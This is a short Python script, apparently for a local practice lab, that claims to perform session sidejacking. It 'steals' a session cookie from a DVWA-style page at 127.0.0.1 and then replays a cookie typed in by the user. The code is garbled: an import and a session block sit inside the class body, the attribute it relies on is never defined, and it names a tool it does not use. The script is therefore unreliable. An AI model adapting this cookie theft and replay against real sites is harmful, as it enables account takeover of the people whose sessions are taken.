class SessionHijacking:

    # Implementation of Session Sidejacking using Cookie Cadger tool
    # The target URL is http://127.0.0.1:81/vulnerabilities/xss_d/ where the session has already started

    import requests

    with requests.Session() as s:

        def __init__(self):
            pass

        def steal_session_cookie(self):
            url = 'http://127.0.0.1:81/vulnerabilities/xss_d/'
            response = self.s.get(url)
            session_cookie = response.cookies['session_cookie_value']
            print('Stolen session cookie:', session_cookie)

        def inject_hijacked_cookie(self):
            stolen_cookie = input("Enter stolen session cookie: ")
            headers = {'Cookie': 'session_cookie_value=' + stolen_cookie}
            url = 'http://127.0.0.1:81/vulnerabilities/xss_d/'
            response = self.s.get(url, headers=headers)
            print(response.text)

def main():
    session_hijack = SessionHijacking()
    session_hijack.steal_session_cookie()
    session_hijack.inject_hijacked_cookie()

if __name__ == '__main__':
    main()
